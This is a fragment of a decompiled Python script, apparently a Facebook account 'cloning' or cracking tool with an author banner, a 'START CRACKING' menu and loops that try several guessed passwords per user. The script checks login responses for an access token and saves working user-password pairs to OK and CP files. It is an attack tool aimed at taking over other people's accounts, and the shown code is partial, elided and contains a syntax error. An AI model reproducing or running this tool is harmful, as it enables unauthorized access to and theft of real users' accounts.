# coding: utf-8
# Decompiled By FIAZ KHAN
# uncompyle6 version 7.0.0
# Original written By FIAZ KHAN


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
__author__ = 'FIAZ'
__copyright = 'All rights reserved . Copyright  FIAZ KHAN'
CorrectUsername = 'FIIAZ''
os.system('clear')
loop = 'true'
while (loop == 'true'):
...
\033[1;97m--------------------------------------------------
\033[1;91m AUTHOR      :  FIAZ KHAN 
\033[1;91m TOOL      :  FB CLONING
\033[1;91m WHATSAPP    :  03094*****5
\033[1;91m FACEBOOK  :  MUHAMMAD FIAZ KHAN 
\033[1;91m VERSOIN   : 6.9.0
\033[1;97m--------------------------------------------------
                                                 """
...
def menu():
    ...
    print(47*'-')
    print
    jalan ('\x1b[1;96m[1] START CRACKING  ')
    print
    print(47*'-')
    action()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [KHAN_OK]  ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [KHAN_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [KHAN_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [KHAN_OK]  ' + k + c + user + '  ^  ' + pass3
                        okb = open('save/CP.txt', 'a')
